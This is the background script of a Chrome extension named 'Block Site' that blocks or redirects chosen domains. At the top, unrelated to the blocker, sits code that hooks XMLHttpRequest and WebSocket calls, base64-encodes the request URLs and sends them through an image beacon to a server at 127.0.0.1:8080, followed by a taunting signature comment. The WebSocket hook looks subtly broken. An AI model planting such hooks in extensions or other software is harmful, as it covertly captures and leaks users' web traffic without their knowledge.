function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var version = function () {return chrome.runtime.getManifest().version};
var homepage = function () {return chrome.runtime.getManifest().homepage_url};
var LOG = false, BLOCKLIST = {}, reason = "startup", notificationsid = '';

chrome.notifications.onClosed.addListener(function () {notificationsid = ''});
if (chrome.runtime.onInstalled) chrome.runtime.onInstalled.addListener(function (e) {reason = e.reason});
if (chrome.runtime.setUninstallURL) chrome.runtime.setUninstallURL(homepage() + "?v=" + version() + "&type=uninstall", function () {});

window.setTimeout(function () {
  if (reason === "startup" || reason === "install") {
    chrome.storage.local.get(null, function (o) {
      var url = homepage() + "?v=" + version() + "&type=install";
      var firefox = navigator.userAgent.toLowerCase().indexOf('firefox') !== -1;
      var support = ("support" in o) ? o["support"] : (firefox ? false : true);
      if (!o.version) chrome.tabs.create({"url": url, "active": true});
      else if (support) {
        if (o.version !== version()) {
          var url = homepage() + "?v=" + version() + "&p=" + o.version + "&type=upgrade";
          chrome.tabs.create({"url": url, "active": true});
        }
      }
      chrome.storage.local.set({"version": version()}, function () {});
    });
  }
}, 3000);

var notifications = function (e) {
  chrome.storage.local.get(null, function (o) {
    var action = ("notifications" in o) ? o["notifications"] : true;
    if (action) {
      var options = {"message": e, "type": "basic", "title": "Block Site", "iconUrl": chrome.runtime.getURL('') + 'data/icons/64.png'};
      if (notificationsid) {
        if (chrome.notifications.update) {
          return chrome.notifications.update(notificationsid, options, function () {});
        }
      }
      return chrome.notifications.create(options, function (id) {notificationsid = id});
    }
  });
};

var observer = function (info) {
  var top = info.url, tabId = info.tabId;
  if (LOG) console.error("top", top, "info", info);
  var hostname = new URL(top).hostname;
  if (hostname in BLOCKLIST) {
    var redirect = BLOCKLIST[hostname];
    if (LOG) console.error("hostname", hostname, "blocklist", BLOCKLIST, "redirect", redirect);
    if (redirect) {
      notifications(hostname + " is blocked & redirected to:\n" + (redirect || 'N/A'));
      redirect = (redirect.indexOf("http") === 0 || redirect.indexOf("ftp") === 0) ? redirect : "https://" + redirect;
      return {"redirectUrl": redirect};
    } else {
      notifications(hostname + " is blocked!\nIn order to remove this domain from the block list, please visit options page.");
      return {"cancel": true};
    }
  }
};

var updatelistener = function (callback) {
  chrome.storage.local.get(null, function (items) {
    BLOCKLIST = ("blocklist" in items) ? items["blocklist"] : {};
    /*  */
    var urls = [];
    for (var domain in BLOCKLIST) urls.push("*://" + domain + "/*");
    var filter = {"urls": urls, "types": ["main_frame"]};
    /*  */
    chrome.webRequest.onBeforeRequest.removeListener(observer);
    if (urls.length) chrome.webRequest.onBeforeRequest.addListener(observer, filter, ["blocking"]);
    callback(true);
  });
};

chrome.contextMenus.create({
  "contexts": ["page"],
  "title": "Block this domain",
  "onclick": function (e) {
    var hostname = new URL(e.pageUrl).hostname;
    /*  */
    BLOCKLIST[hostname] = null;
    if (LOG) console.error("hostname", hostname, "blocklist", BLOCKLIST);
    chrome.storage.local.set({"blocklist": BLOCKLIST}, function () {
      window.setTimeout(function () {chrome.tabs.reload()}, 300);
    });
  }
});

updatelistener(function () {});
chrome.storage.onChanged.addListener(function () {updatelistener(function () {})});
